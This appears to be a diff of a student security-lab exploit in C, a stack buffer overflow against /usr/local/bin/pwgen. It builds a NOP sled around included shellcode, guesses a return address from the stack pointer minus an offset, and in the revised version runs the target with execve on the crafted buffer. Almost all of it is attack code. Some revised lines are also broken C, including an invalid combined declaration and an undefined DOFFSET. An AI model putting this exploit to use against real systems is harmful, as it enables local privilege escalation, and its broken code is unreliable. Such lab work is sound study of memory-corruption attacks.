@@ -5,16 +5,17 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <usr/local/src/shellcode.h>
+#include </usr/local/src/shellcode.h>
 
-#define bsize 2048
+#define DBSIZE 1124
+#define doffset 0
 #define TARGET "/usr/local/bin/pwgen"
 #define NOP   0x90
 unsigned long get_sp(void){
 __asm__("movl %esp, %eax");
 }
 
-int main(void)
+int main(int argc, char *argv[])
 {
   char *args[4];
   char *env[1];
@@ -22,16 +23,19 @@ int main(void)
   char *addr_ptr, addr;
   // one way to invoke pwgen, system() creates a separate process
   int i;
+  int bsize = DBSIZE, int offset = DOFFSET;
 
-  if(!(buf = malloc(2048))){
+
+  if(argc > 1) bsize = atoi(argv[1]);
+    if(argc > 2) offset = atoi(argv[2]);
+
+  if(!(buf = malloc(bsize))){
     printf("error");
     exit(0);
   }
-  // another way
-  args[0] = TARGET; args[1] = "-f";
-  args[2] = ""; args[3] = NULL;
-  addr = get_sp();
+  addr = get_sp() - offset;
   printf("Using address 0x%x...", addr);
+
 
 
   ptr = buf;
@@ -44,14 +48,18 @@ int main(void)
   ptr = buf + ((bsize/2) - (strlen(shellcode)/2 ));
   for (i = 0 ; i <strlen(shellcode);i++)
       *(ptr++) = shellcode[i];
-    buf(bsize - 1) = '\0';
-    printf("%s",buf);
-  env[0] = NULL;
+
+    buf[bsize - 1] = '\0';
+
+
+    args[0] = TARGET; args[1] = "-s";
+    args[2] = ""; args[3] = NULL;
+    env[0] = NULL;
   // execve() executes the target program by overwriting the
   // memory of the process in which execve() is executing, i.e.,
   // execve() should never return
-//  if (execve(TARGET, args, env) < 0)
-//  fprintf(stderr, "execve failed.\n");
+  if (execve(TARGET, args, env) < 0)
+  fprintf(stderr, "execve failed.\n");
 
   exit(0);
 }
